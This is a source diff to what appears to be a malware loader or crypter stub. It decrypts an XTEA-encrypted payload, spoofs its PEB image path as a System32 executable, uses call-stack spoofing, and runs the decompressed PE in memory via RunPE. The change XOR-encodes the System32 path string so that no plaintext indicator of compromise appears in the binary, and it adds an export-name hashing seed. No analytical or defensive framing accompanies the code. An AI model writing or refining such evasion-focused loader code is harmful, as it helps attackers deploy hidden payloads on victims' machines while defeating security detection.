@@ -111,7 +111,9 @@ extern "C" int EntryPoint() {
     Xtea_DeriveKey(xteaKey, key_salt);
     Xtea_Crypt(pEncryptedPayload, payloadSize, xteaKey);
 
-    /* Wipe key material from stack immediately — no residue */
+    /* Wipe key material from stack immediately — no residue.
+     * exportSeed is extracted first: RunPE needs it to hash export names. */
+    DWORD exportSeed = key_salt[0];
     xteaKey[0]  = xteaKey[1]  = xteaKey[2]  = xteaKey[3]  = 0;
     key_salt[0] = key_salt[1] = key_salt[2] = key_salt[3] = 0;
 
@@ -120,12 +122,16 @@ extern "C" int EntryPoint() {
      * internally by some Win32 APIs during resource loading. */
     if (!(opsecFlags & OPSEC_FLAG_NO_PEB)) {
         /* Build full spoof path: "C:\Windows\System32\" + pSpoofExe (ASCII filename).
-         * Manual narrow->wide conversion — no CRT, no mbstowcs.
-         * System32 filenames are always ASCII so (WCHAR)(unsigned char) is exact. */
-        static const WCHAR kSpoofPrefix[] = L"C:\\Windows\\System32\\";
+         * Prefix is XOR-encoded (key 0x66) — no plaintext wide-string IOC in .rdata.
+         * Decoded chars: C : \ W i n d o w s \ S y s t e m 3 2 \ */
+        static const BYTE kPrefixEnc[] = {
+            0x25,0x5C,0x3A,0x31,0x0F,0x08,0x02,0x09,
+            0x11,0x15,0x3A,0x35,0x1F,0x15,0x12,0x03,
+            0x0B,0x55,0x54,0x3A
+        };
         WCHAR spoofPathW[80];
         int   wpi = 0;
-        while (kSpoofPrefix[wpi]) { spoofPathW[wpi] = kSpoofPrefix[wpi]; wpi++; }
+        for (int ii = 0; ii < 20; ii++) spoofPathW[wpi++] = (WCHAR)(kPrefixEnc[ii] ^ 0x66u);
         if (pSpoofExe) {
             const char* pNameA = pSpoofExe;
             while (*pNameA && wpi < 79) { spoofPathW[wpi++] = (WCHAR)(unsigned char)*pNameA++; }
@@ -288,7 +294,7 @@ extern "C" int EntryPoint() {
         pVirtualFree(pDecompressedPE, 0, MEM_RELEASE);
     } else {
         void (*pPreExec)(void) = (opsecFlags & OPSEC_FLAG_NO_CALLSTACK) ? NULL : VehSpoof_Cleanup;
-        DWORD runPeRes = RunPE(pDecompressedPE, exportHash, pExportArg, pPreExec);
+        DWORD runPeRes = RunPE(pDecompressedPE, exportHash, exportSeed, pExportArg, pPreExec);
 
         custom_memset(pDecompressedPE, 0, origDecompSize);
         pVirtualFree(pDecompressedPE, 0, MEM_RELEASE);
